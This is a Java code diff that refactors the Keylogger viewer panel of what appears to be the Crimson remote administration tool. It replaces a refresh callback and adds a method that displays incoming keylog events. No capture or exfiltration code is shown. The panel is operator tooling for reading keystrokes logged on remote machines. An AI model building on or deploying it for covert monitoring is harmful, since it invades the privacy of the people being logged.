@@ -25,9 +25,10 @@ import java.awt.event.MouseEvent;
 import javax.swing.JMenu;
 import javax.swing.JMenuBar;
 import javax.swing.JPanel;
-import javax.swing.JScrollPane;
 
+import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
 import com.subterranean_security.crimson.sv.ClientProfile;
+import com.subterranean_security.crimson.sv.keylogger.LogCallback;
 import com.subterranean_security.crimson.viewer.ui.panel.Console;
 import com.subterranean_security.crimson.viewer.ui.screen.controlpanels.client.CPPanel;
 
@@ -82,7 +83,7 @@ public class Keylogger extends JPanel implements CPPanel {
 
 		content = new KeyLogPane();
 		content_panel.add(content, "KEYLOG");
-		
+
 		loading = new JPanel();
 		content_panel.add(loading, "LOADING");
 
@@ -95,19 +96,20 @@ public class Keylogger extends JPanel implements CPPanel {
 		mnView = new JMenu("View");
 		menuBar.add(mnView);
 
-		profile.getKeylog().addCallback(new Runnable() {
-			public void run() {
-				logTree.refreshTree();
-			}
-		});
+		profile.getKeylog().addCallback(new LogCallback(this));
 
+	}
+
+	public void addKEvent(EV_KEvent k) {
+		logTree.refreshTree();
+		content.updateContent(k);
 	}
 
 	public void showKeylog() {
 		((CardLayout) content_panel.getLayout()).show(content_panel, "KEYLOG");
 	}
-	
-	public void loadKeylog(){
+
+	public void loadKeylog() {
 		((CardLayout) content_panel.getLayout()).show(content_panel, "LOADING");
 	}
 
